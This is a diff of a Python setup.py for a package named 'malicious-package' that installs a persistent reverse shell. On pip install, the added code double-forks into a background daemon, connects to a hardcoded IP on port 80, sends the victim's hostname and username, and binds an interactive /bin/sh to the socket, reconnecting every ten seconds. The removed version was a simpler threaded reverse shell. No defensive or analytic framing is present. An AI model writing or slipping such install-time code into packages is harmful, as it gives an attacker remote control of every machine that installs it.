@@ -1,70 +1,80 @@
 from setuptools import setup
+import os
+import sys
 import socket
 import subprocess
-import os
-import threading
 import time
 
-def reverse_shell():
+def daemonize():
+    # First fork
     try:
-        # Your VPS IP
-        ATTACKER_IP = "142.93.23.15"
-        ATTACKER_PORT = 80
-        
-        # Connect to VPS
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ATTACKER_IP, ATTACKER_PORT))
-        
-        # Send initial connection message
-        s.send(b"\n[+] REVERSE SHELL CONNECTED\n")
-        s.send(b"[+] Type commands and press Enter\n")
-        s.send(b"[+] Output will appear below\n")
-        s.send(b"-" * 50 + b"\n")
-        
-        while True:
-            # Wait for command
-            s.send(b"\n$ ")
-            cmd = s.recv(1024).decode().strip()
+        pid = os.fork()
+        if pid > 0:
+            # Exit first parent
+            sys.exit(0)
+    except OSError:
+        sys.exit(1)
+    
+    # Decouple from parent environment
+    os.chdir("/")
+    os.setsid()
+    os.umask(0)
+    
+    # Second fork
+    try:
+        pid = os.fork()
+        if pid > 0:
+            # Exit from second parent
+            sys.exit(0)
+    except OSError:
+        sys.exit(1)
+    
+    # Now running as daemon
+    reverse_shell()
+
+def reverse_shell():
+    time.sleep(3)  # Wait for pip to finish
+    
+    while True:
+        try:
+            ATTACKER_IP = "142.93.23.15"
+            ATTACKER_PORT = 80
             
-            if cmd.lower() == 'exit':
-                break
-                
-            if cmd:
-                try:
-                    # Run command and get output
-                    result = subprocess.run(
-                        cmd,
-                        shell=True,
-                        capture_output=True,
-                        text=True,
-                        timeout=10
-                    )
-                    
-                    # Send output back
-                    output = result.stdout + result.stderr
-                    if output:
-                        s.send(output.encode())
-                    else:
-                        s.send(b"[+] Command executed (no output)\n")
-                        
-                except Exception as e:
-                    s.send(f"Error: {str(e)}\n".encode())
-        
-        s.close()
-        
-    except Exception as e:
-        # Log error to file
-        with open("/tmp/revshell_debug.log", "w") as f:
-            f.write(f"Error: {str(e)}")
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
+            
+            # Send victim info
+            hostname = subprocess.getoutput("hostname")
+            username = subprocess.getoutput("whoami")
+            current_dir = subprocess.getoutput("pwd")
+            
+            s.send(f"""
+╔════════════════════════════════════╗
+║    VICTIM SHELL - PERSISTENT       ║
+╚════════════════════════════════════╝
+Hostname: {hostname}
+User: {username}
+Directory: {current_dir}
+══════════════════════════════════════
 
-# Start the shell
-thread = threading.Thread(target=reverse_shell)
-thread.daemon = True
-thread.start()
+$ """.encode())
+            
+            # Interactive shell
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            
+            subprocess.call(["/bin/sh", "-i"])
+            s.close()
+            
+        except:
+            time.sleep(10)  # Wait before reconnecting
+            continue
 
-# Give it time to connect
-time.sleep(2)
+# Start the daemon
+daemonize()
 
+# Normal setup.py
 setup(
     name="malicious-package",
     version="1.0.0",
